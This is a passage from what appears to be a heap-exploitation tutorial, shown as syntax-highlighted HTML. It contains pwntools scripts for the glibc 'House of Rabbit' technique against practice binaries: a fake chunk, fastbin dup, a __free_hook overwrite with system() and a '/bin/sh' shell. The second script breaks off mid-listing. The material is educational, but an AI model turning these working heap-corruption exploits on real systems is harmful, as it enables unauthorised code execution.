+</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>info</span><span class=p>(</span><span class=n>mess</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>mess</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>success</span><span class=p>(</span><span class=n>mess</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=n>mess</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>error</span><span class=p>(</span><span class=n>mess</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>error</span><span class=p>(</span><span class=n>mess</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;LD_PRELOAD&#34;</span><span class=p>:</span> <span class=n>libc</span><span class=o>.</span><span class=n>path</span><span class=p>},</span><span class=n>gdbscript</span><span class=o>=</span><span class=n>gs</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;LD_LIBRARY_PATH&#34;</span><span class=p>:</span> <span class=n>libc</span><span class=o>.</span><span class=n>path</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>index</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Select the &#34;malloc&#34; option; send size &amp; data.</span>
+</span></span><span class=line><span class=cl><span class=c1># Returns chunk index.</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>index</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;size: &#34;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>size</span><span class=si>}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;data: &#34;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>index</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>index</span> <span class=o>-</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Select the &#34;free&#34; option; send index.</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;index: &#34;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>index</span><span class=si>}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Select the &#34;amend age&#34; option; send new value.</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>amend_age</span><span class=p>(</span><span class=n>age</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;3&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;age: &#34;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>age</span><span class=si>}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Calculate the &#34;wraparound&#34; distance between two addresses.</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delta</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=mh>0xffffffffffffffff</span> <span class=o>-</span> <span class=n>x</span><span class=p>)</span> <span class=o>+</span> <span class=n>y</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># This binary leaks the address of puts(), use it to resolve the libc load address.</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;puts() @ &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>puts</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>timeout</span> <span class=o>=</span> <span class=mf>0.1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =============================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =-=-=- PREPARE A FAKE CHUNK -=-=-=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Craft a fake chunk using the &#34;age&#34; field.</span>
+</span></span><span class=line><span class=cl><span class=c1># Set its prev_inuse flag to avoid backward consolidation.</span>
+</span></span><span class=line><span class=cl><span class=c1># This fake chunk has a size of 0, so it acts as its own forward consolidation guard.</span>
+</span></span><span class=line><span class=cl><span class=n>age</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;age: &#34;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>age</span><span class=si>}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =-=-=- INCREASE MMAP THRESHOLD -=-=-=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Before we can increase the main arena&#39;s system_mem value, we must increase the mmap_threshold.</span>
+</span></span><span class=line><span class=cl><span class=c1># We do this by requesting then freeing a chunk with size beyond the mmap threshold.</span>
+</span></span><span class=line><span class=cl><span class=n>mem</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x5fff8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;Y&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span> <span class=c1># Allocated via mmap().</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>mem</span><span class=p>)</span> <span class=c1># Freeing an mmapped chunk increases the mmap threshold to its size.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =-=-=- INCREASE SYSTEM_MEM -=-=-=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Now that the mmap threshold is beyond 0x60000, requesting chunks of that size will allocate them</span>
+</span></span><span class=line><span class=cl><span class=c1># from a heap, rather than via mmap().</span>
+</span></span><span class=line><span class=cl><span class=c1># This in turn will increase the total memory checked out from the kernel, which is tracked by</span>
+</span></span><span class=line><span class=cl><span class=c1># an arena&#39;s system_mem field.</span>
+</span></span><span class=line><span class=cl><span class=n>mem</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x5fff8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;Z&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =-=-=- LINK FAKE CHUNK INTO A FASTBIN -=-=-=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Leverage a fastbin dup to link the fake &#34;age&#34; chunk into the 0x20 fastbin.</span>
+</span></span><span class=line><span class=cl><span class=n>dup</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x18</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>safety</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x18</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;B&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>dup</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>safety</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>dup</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x18</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>user</span><span class=p>))</span> <span class=c1># Address of fake chunk.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =-=-=- CONSOLIDATE FAKE CHUNK INTO UNSORTEDBIN -=-=-=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Trigger malloc_consolidate() to move the fake chunk from the fastbins into the unsortedbin.</span>
+</span></span><span class=line><span class=cl><span class=c1># Use a consolidation with the top chunk to achieve this.</span>
+</span></span><span class=line><span class=cl><span class=n>consolidate</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x88</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;C&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>consolidate</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =-=-=- SORT FAKE CHUNK INTO BIN 126 -=-=-=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Sort the fake chunk into bin 126 by setting its size to the minimum required to qualify for it,</span>
+</span></span><span class=line><span class=cl><span class=c1># then requesting a chunk larger than the fake chunk.</span>
+</span></span><span class=line><span class=cl><span class=c1># This part is where the unsortedbin size sanity check would catch us if we hadn&#39;t increased system_mem.</span>
+</span></span><span class=line><span class=cl><span class=n>amend_age</span><span class=p>(</span><span class=mh>0x80001</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x80008</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;D&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Increase the fake chunk size so that it can reach the free hook.</span>
+</span></span><span class=line><span class=cl><span class=c1># Making this value too large will fail the size sanity check during unsortedbin allocation</span>
+</span></span><span class=line><span class=cl><span class=c1># of the following chunk. It can also trigger segfaults or busfaults when the remaindering code</span>
+</span></span><span class=line><span class=cl><span class=c1># attempts to update the prev_size field of the succeeding chunk.</span>
+</span></span><span class=line><span class=cl><span class=n>distance</span> <span class=o>=</span> <span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>__free_hook</span> <span class=o>-</span> <span class=mh>0x20</span><span class=p>)</span> <span class=o>-</span> <span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>user</span>
+</span></span><span class=line><span class=cl><span class=n>amend_age</span><span class=p>(</span><span class=n>distance</span> <span class=o>+</span> <span class=mh>0x29</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =-=-=- OVERWRITE FREE HOOK -=-=-=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># The next request is serviced by the fake chunk.</span>
+</span></span><span class=line><span class=cl><span class=c1># Request a large chunk to bridge the gap between the fake chunk and the free hook.</span>
+</span></span><span class=line><span class=cl><span class=c1># Write the string &#34;/bin/sh&#34; into this chunk for use later as the argument to system().</span>
+</span></span><span class=line><span class=cl><span class=n>binsh</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=n>distance</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;/bin/sh</span><span class=se>\0</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># The next request is serviced by the fake chunk again and overlaps the free hook.</span>
+</span></span><span class=line><span class=cl><span class=c1># Use it to overwrite the free hook with the address of system().</span>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x18</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>pack</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>system</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Free the chunk with &#34;/bin/sh&#34; in the 1st qword of its user data.</span>
+</span></span><span class=line><span class=cl><span class=c1># This triggers a call to system(&#34;/bin/sh&#34;).</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>binsh</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =============================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=heap-feng-shui>Heap Feng Shui</h2><h3 id=shellpy-1>shell.py</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span><span class=lnt>159
+</span><span class=lnt>160
+</span><span class=lnt>161
+</span><span class=lnt>162
+</span><span class=lnt>163
+</span><span class=lnt>164
+</span><span class=lnt>165
+</span><span class=lnt>166
+</span><span class=lnt>167
+</span><span class=lnt>168
+</span><span class=lnt>169
+</span><span class=lnt>170
+</span><span class=lnt>171
+</span><span class=lnt>172
+</span><span class=lnt>173
+</span><span class=lnt>174
+</span><span class=lnt>175
+</span><span class=lnt>176
+</span><span class=lnt>177
+</span><span class=lnt>178
+</span><span class=lnt>179
+</span><span class=lnt>180
+</span><span class=lnt>181
+</span><span class=lnt>182
+</span><span class=lnt>183
+</span><span class=lnt>184
+</span><span class=lnt>185
+</span><span class=lnt>186
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./house_of_rabbit_nofast&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#libc = ELF(&#39;&#39;, checksec=False)</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>libc</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>b *main
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+187
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+298
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+396
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+463
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+575
+</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>info</span><span class=p>(</span><span class=n>mess</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>mess</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>success</span><span class=p>(</span><span class=n>mess</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=n>mess</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>error</span><span class=p>(</span><span class=n>mess</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>error</span><span class=p>(</span><span class=n>mess</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;LD_PRELOAD&#34;</span><span class=p>:</span> <span class=n>libc</span><span class=o>.</span><span class=n>path</span><span class=p>},</span><span class=n>gdbscript</span><span class=o>=</span><span class=n>gs</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;LD_LIBRARY_PATH&#34;</span><span class=p>:</span> <span class=n>libc</span><span class=o>.</span><span class=n>path</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>index</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Select the &#34;malloc&#34; option; send size &amp; data.</span>
+</span></span><span class=line><span class=cl><span class=c1># Returns chunk index.</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>index</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;size: &#34;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>size</span><span class=si>}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;data: &#34;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>index</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>index</span> <span class=o>-</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Select the &#34;free&#34; option; send index.</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;index: &#34;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>index</span><span class=si>}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
